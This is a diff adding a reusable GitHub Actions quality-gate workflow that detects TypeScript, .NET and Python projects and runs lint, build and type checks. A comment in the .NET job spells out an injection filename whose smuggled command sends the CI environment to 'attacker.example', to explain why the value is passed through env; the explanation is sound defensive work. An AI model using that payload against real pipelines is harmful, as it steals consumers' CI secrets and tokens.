@@ -1,0 +1,344 @@
+# maxi-quality — the reusable quality gate (CONCEPT §7).
+#
+# A consuming repo's entire workflow file:
+#
+#   name: quality
+#   on: [push, pull_request]
+#   jobs:
+#     quality:
+#       uses: maximalcode/maxi-quality/.github/workflows/quality.yml@v1
+#
+# Callable from any repository. While this repo was private that needed an
+# Actions access policy (access_level=user, issues #5/#8); publishing removed
+# that constraint. The Layer 2 job pulls this repo's rules through the composite
+# action download, so consumers need no PAT and no checkout of this repo.
+#
+# `#NN` in comments here refers to this project's pre-publication tracker,
+# which stayed private. They record why something was decided. They are NOT
+# this repo's issue numbers, which start fresh at #1.
+#
+# Version coupling: this file references actions/layer2@v1. The v1 tag pins
+# BOTH the workflow and the action — they move together, never independently.
+#
+# v1 scope (deliberate): npm and pnpm-with-packageManager-field consumers,
+# TS + C#. Anything else fails loud, not silent.
+
+name: quality
+
+on:
+  workflow_call:
+    inputs:
+      languages:
+        description: >-
+          'auto' detects by lockfile/project glob. Or a CSV subset of
+          "ts,dotnet,python" to force (e.g. "ts" to skip .NET on a mixed repo).
+          'none' runs Layer 2 ONLY — the adoption entry point for a repo that
+          wants secrets/vulns/conventions gated before taking on Layer 1.
+        type: string
+        default: 'auto'
+      node-version:
+        type: string
+        default: '24'
+      dotnet-version:
+        type: string
+        default: '10.0.x'
+      python-version:
+        type: string
+        default: '3.12'
+      uv-version:
+        description: >-
+          Pinned uv version for lockfile-based Python projects. Exposed as an
+          input so a consumer can hold or advance it without waiting on this
+          repo — but it has a PIN as a default, never "latest".
+        type: string
+        default: '0.12.1'
+      changed-only:
+        description: >-
+          Base ref for new-code-only Layer 2 (adoption ratchet, CONCEPT §8).
+          Empty = full scan.
+        type: string
+        default: ''
+      licenses:
+        description: >-
+          Comma-separated SPDX allowlist, e.g. "MIT,Apache-2.0,ISC". Any
+          dependency outside it fails the gate. Empty (default) = no licence
+          gate. There is deliberately no default allowlist: measured against
+          this repo's own tree, a plausible-looking one flagged
+          SonarAnalyzer.CSharp and typing-extensions as "non-standard" and
+          pathspec as MPL-2.0 — a default would be wrong for someone on day one,
+          and a licence gate nobody chose is a licence gate everybody disables.
+          The full inventory is in the standing report either way.
+        type: string
+        default: ''
+    outputs:
+      # Exposed so a caller can assert that detection actually FIRED (#38).
+      # Without this a consumer's run is green in two very different cases: the
+      # gate ran and passed, or detection silently found nothing and every
+      # language job skipped. Those must not look the same — a quality gate
+      # that quietly stopped checking is the worst failure this repo has.
+      #
+      # A consuming repo can assert `has_ts == 'true'` for exactly this reason,
+      # and should if it wants the guarantee.
+      has_ts:
+        description: 'true when at least one TypeScript project was detected'
+        value: ${{ jobs.detect.outputs.has_ts }}
+      has_dotnet:
+        description: 'true when at least one .NET project was detected'
+        value: ${{ jobs.detect.outputs.has_dotnet }}
+      has_python:
+        description: 'true when at least one Python project was detected'
+        value: ${{ jobs.detect.outputs.has_python }}
+
+jobs:
+  detect:
+    runs-on: ubuntu-latest
+    outputs:
+      ts_dirs: ${{ steps.scan.outputs.ts_dirs }}
+      dotnet_targets: ${{ steps.scan.outputs.dotnet_targets }}
+      python_dirs: ${{ steps.scan.outputs.python_dirs }}
+      has_ts: ${{ steps.scan.outputs.has_ts }}
+      has_dotnet: ${{ steps.scan.outputs.has_dotnet }}
+      has_python: ${{ steps.scan.outputs.has_python }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - id: scan
+        shell: bash
+        env:
+          LANGS: ${{ inputs.languages }}
+        run: |
+          set -Eeuo pipefail
+          # 'none' is handled EXPLICITLY, not left to fall through the match.
+          # It would work either way today — "none" happens to match no language
+          # — but that is an accident of string comparison, and the first person
+          # to add input validation would silently turn "Layer 2 only" back into
+          # "Layer 1 on everything". Consumer A depends on this value, so it is
+          # a contract, spelled out.
+          want() {
+            [[ "$LANGS" == "none" ]] && return 1
+            [[ "$LANGS" == "auto" || ",$LANGS," == *",$1,"* ]]
+          }
+
+          # TS: every directory holding a lockfile (workspace roots carry the
+          # only lockfile in npm/pnpm monorepos, so this finds package roots).
+          ts_dirs='[]'
+          if want ts; then
+            ts_dirs=$(find . -name node_modules -prune -o -type f \
+                        \( -name package-lock.json -o -name pnpm-lock.yaml \) -print0 \
+                      | xargs -0 -r -n1 dirname | sort -u \
+                      | sed 's|^\./||' | jq -R . | jq -sc .)
+          fi
+
+          # .NET: solutions if any exist, else loose csproj files.
+          dotnet_targets='[]'
+          if want dotnet; then
+            dotnet_targets=$(find . -name node_modules -prune -o -type f -name '*.sln' -print \
+                             | sed 's|^\./||' | jq -R . | jq -sc .)
+            if [[ "$dotnet_targets" == "[]" ]]; then
+              dotnet_targets=$(find . -name node_modules -prune -o -type f -name '*.csproj' -print \
+                               | sed 's|^\./||' | jq -R . | jq -sc .)
+            fi
+          fi
+
+          # Python: lockfile dirs, same reasoning as TS — in a uv/poetry
+          # workspace only the ROOT carries a lock, while every member carries
+          # its own pyproject.toml. Keying on pyproject would fan out one job
+          # per workspace member and check the same tree N times.
+          # pyproject/requirements are the fallback for un-locked projects.
+          python_dirs='[]'
+          if want python; then
+            python_dirs=$(find . \( -name node_modules -o -name .venv -o -name .git \) -prune -o -type f \
+                            \( -name uv.lock -o -name poetry.lock \) -print0 \
+                          | xargs -0 -r -n1 dirname | sort -u \
+                          | sed 's|^\./||' | jq -R . | jq -sc .)
+            if [[ "$python_dirs" == "[]" ]]; then
+              python_dirs=$(find . \( -name node_modules -o -name .venv -o -name .git \) -prune -o -type f \
+                              \( -name pyproject.toml -o -name requirements.txt \) -print0 \
+                            | xargs -0 -r -n1 dirname | sort -u \
+                            | sed 's|^\./||' | jq -R . | jq -sc .)
+            fi
+          fi
+
+          has_ts=false; [[ "$ts_dirs" != "[]" ]] && has_ts=true
+          has_dotnet=false; [[ "$dotnet_targets" != "[]" ]] && has_dotnet=true
+          has_python=false; [[ "$python_dirs" != "[]" ]] && has_python=true
+
+          {
+            echo "ts_dirs=$ts_dirs"
+            echo "dotnet_targets=$dotnet_targets"
+            echo "python_dirs=$python_dirs"
+            echo "has_ts=$has_ts"
+            echo "has_dotnet=$has_dotnet"
+            echo "has_python=$has_python"
+          } >> "$GITHUB_OUTPUT"
+          echo "detected: ts=$ts_dirs dotnet=$dotnet_targets python=$python_dirs"
+
+  typescript:
+    needs: detect
+    if: needs.detect.outputs.has_ts == 'true'
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        dir: ${{ fromJSON(needs.detect.outputs.ts_dirs) }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7
+        with:
+          node-version: ${{ inputs.node-version }}
+      - name: Install and lint
+        shell: bash
+        working-directory: ${{ matrix.dir }}
+        run: |
+          set -Eeuo pipefail
+          if [[ -f pnpm-lock.yaml ]]; then
+            # corepack reads the pinned "packageManager" field; a pnpm repo
+            # without one fails here on purpose — pin it, don't guess it.
+            if ! grep -q '"packageManager"' package.json; then
+              echo '::error::pnpm-lock.yaml found but package.json has no "packageManager" field. Pin it (e.g. "pnpm@11.10.0") so CI and local installs agree.'
+              exit 1
+            fi
+            corepack enable
+            pnpm install --frozen-lockfile
+            pnpm run lint
+          else
+            npm ci
+            npm run lint
+          fi
+
+  dotnet:
+    needs: detect
+    if: needs.detect.outputs.has_dotnet == 'true'
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        target: ${{ fromJSON(needs.detect.outputs.dotnet_targets) }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6
+        with:
+          dotnet-version: ${{ inputs.dotnet-version }}
+      # The gate lives in Directory.Build.props (TreatWarningsAsErrors) —
+      # a plain build IS the analysis run.
+      #
+      # `env:`, NOT `dotnet build "${{ matrix.target }}"`. That value is a
+      # FILENAME found by globbing the consumer's own tree, so it is whatever a
+      # contributor put in a pull request — and `${{ }}` is substituted into the
+      # script text before bash parses it. A file named
+      #
+      #     a";env|curl attacker.example -d@-;".csproj
+      #
+      # closed the quoted argument and ran the rest as shell, in the CONSUMER's
+      # CI with the consumer's token. git allows quotes and semicolons in paths,
+      # and the jq encoding in `detect` protects the YAML, not the shell.
+      #
+      # No slashes, deliberately: a filename cannot contain '/', which rules out
+      # `curl https://host/path|sh` but is not a mitigation — that payload
+      # exfiltrates the entire environment without needing one.
+      #
+      # env: hands bash a value instead of splicing text, so the same filename
+      # is just an argument that fails to build.
+      - name: Build
+        shell: bash
+        env:
+          TARGET: ${{ matrix.target }}
+        run: dotnet build "$TARGET"
+
+  python:
+    needs: detect
+    if: needs.detect.outputs.has_python == 'true'
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        dir: ${{ fromJSON(needs.detect.outputs.python_dirs) }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7
+        with:
+          python-version: ${{ inputs.python-version }}
+
+      # v1 scope, deliberately narrow and LOUD about it: uv or pip. The project
+      # supplies ruff/mypy as dev dependencies, exactly as a TS consumer supplies
+      # eslint — this workflow runs the tools, it does not smuggle in its own
+      # versions behind the project's back.
+      #
+      # Detection is its own step so the installer below can be conditional. It
+      # used to be one branchy script, which is what forced `curl | sh` inline.
+      - name: Which Python toolchain?
+        id: mode
+        shell: bash
+        working-directory: ${{ matrix.dir }}
+        run: |
+          set -Eeuo pipefail
+          if [[ -f uv.lock ]]; then
+            echo 'tool=uv' >> "$GITHUB_OUTPUT"
+          elif [[ -f requirements-dev.txt || -f requirements.txt ]]; then
+            echo 'tool=pip' >> "$GITHUB_OUTPUT"
+          else
+            echo '::error::Python project detected but no uv.lock, requirements-dev.txt or requirements.txt. v1 supports uv and pip only — add one, or pass languages to exclude python.'
+            exit 1
+          fi
+
+      # SHA-pinned, like every other action here. This step replaced
+      # `curl -LsSf https://astral.sh/uv/install.sh | sh`, which was unpinned
+      # remote code fetched over a moving URL and piped into a shell — inside a
+      # workflow that runs in EVERY consumer's CI with THEIR token. A compromise
+      # of that endpoint would have been a compromise of every adopter's
+      # pipeline, and it flatly contradicted this repo's own pinning policy. The
+      # `uses:` SHA guard in ci.yml never caught it because a pipe is not a
+      # `uses:` line; that guard now covers this shape too.
+      - name: Install uv
+        if: steps.mode.outputs.tool == 'uv'
+        uses: astral-sh/setup-uv@c771a70e6277c0a99b617c7a806ffedaca235ff9 # v9.0.0
+        with:
+          version: ${{ inputs.uv-version }}
+
+      - name: Lint and type-check (uv)
+        if: steps.mode.outputs.tool == 'uv'
+        shell: bash
+        working-directory: ${{ matrix.dir }}
+        run: |
+          set -Eeuo pipefail
+          uv sync --frozen --all-extras --dev
+          uv run ruff check .
+          uv run mypy .
+
+      - name: Lint and type-check (pip)
+        if: steps.mode.outputs.tool == 'pip'
+        shell: bash
+        working-directory: ${{ matrix.dir }}
+        run: |
+          set -Eeuo pipefail
+          # Written as if-blocks, NOT `[[ -f x ]] && pip install x`.
+          #
+          # The precise rule, measured: under `set -e` a false `[[ ]] && cmd`
+          # does NOT abort mid-script. It bites as the LAST statement of a
+          # script — the script exits 1 and the step goes red — or of a
+          # function, which then returns 1. An earlier version of this comment
+          # claimed it aborts the job outright; that was wrong. `if` blocks are
+          # still the right shape here, because the last of these lines IS the
+          # last statement when requirements-dev.txt is absent.
+          if [[ -f requirements.txt ]]; then
+            pip install -r requirements.txt
+          fi
+          if [[ -f requirements-dev.txt ]]; then
+            pip install -r requirements-dev.txt
+          fi
+          ruff check .
+          mypy .
+
+  layer2:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+        with:
+          # Gitleaks scans commit history, not just the tree.
+          fetch-depth: 0
+      # Pinned to the same tag that pins this workflow — v1 moves both
+      # together, never independently. (Acceptance ran against @main first;
+      # this line flipped in the commit that got tagged v1.)
+      - uses: maximalcode/maxi-quality/actions/layer2@v1
+        with:
+          changed-only: ${{ inputs.changed-only }}
+          licenses: ${{ inputs.licenses }}
